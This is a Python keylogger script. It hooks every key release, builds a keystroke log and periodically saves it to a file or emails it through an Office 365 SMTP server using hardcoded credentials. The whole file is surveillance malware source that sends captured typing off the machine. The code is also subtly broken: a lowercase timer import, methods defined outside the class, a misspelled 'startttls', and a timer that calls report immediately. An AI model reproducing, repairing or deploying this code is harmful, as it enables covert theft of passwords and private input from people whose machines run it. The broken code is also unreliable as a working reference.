#!/usr/bin/python3

import smtplib
import keyboard
from threading import timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

SEND_REPORT_EVERY = 60 
EMAIL_ADDRESS = "email@domain.com"
EMAIL_PASSWORD = "passwordHere!"

class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method # string var that contains log of keystrokes within self.interval
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

#################################################
#           Define callback function            #
#################################################

def callback(self, event):
    name = event.name
    if len(name) > 1:
        if name == "space":
            name = " "
        elif name == "enter":
            name = "[ENTER]\n"
        elif name == "decimal":
            name = "."
        else:
            name = name.replace(" ", "_")
            name = f"[{name.upper()}]"
    self.log += name
    # when key is released, button pressed is appended to self.log

#################################################
#              Report to Text files             #
#################################################

def update_filename(self):
    start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")

    end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
    self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

def report_to_file(self):
    with open(f"{self.filename}.txt", "w") as f:
        print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

#################################################
#               Report to Email                 #
#################################################

def prepare_mail(self, message):
    msg = MIMEMultipart("alternative")
    msg["From"] = EMAIL_ADDRESS
    msg["To"] = EMAIL_ADDRESS
    msg["Subject"] = "key logs"

    html = f"<p>{message}</p>"
    text_part = MIMEText(message, "plain")
    html_part = MIMEText(html, "html")
    msg.attach(text_part)
    msg.attach(html_part)
    return msg.as_string()

def sendmail(self, email, password, message, verbose=1):
    server = smtplib.SMTP(host="smtp.office365.com", port=587)
    server.startttls()
    server.login(email, password)
    server.sendmail(email, email, self.prepare_mail(message))
    server.quit()
    if verbose:
        print(f"{datetime.now()} - Sent email to email containing:\ {message}")

##################################################
#    report to key logs after every period       #
##################################################

        

def report(self):
    if self.log:
        self.end_dt = datetime.now()
        self.update_filename()
        if self.report_method == "email":
            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
        elif self.report_method == "file":
            self.report_to_file()
            print(f"[{self.datetime}] - {self.log}")
        self.start_dt = datetime.now()
    self.log = ""
    timer = timer(interval=self.interval, function=self.report())
    timer.daemon = True
    timer.start()

#################################################
#     define method that calls on_release()     #
#################################################

def start(self):
    self.start_dt = datetime.now()
    keyboard.on_release(callback=self.callback)
    self.report()
    print(f"{datetime.now()} - Started keylogging")
    keyboard.wait()

#################################################
#          instantiate keylogger class          #
#################################################

if __name__ == "__main__":
    # keylogger to email
    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")

    # send logs to local file
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()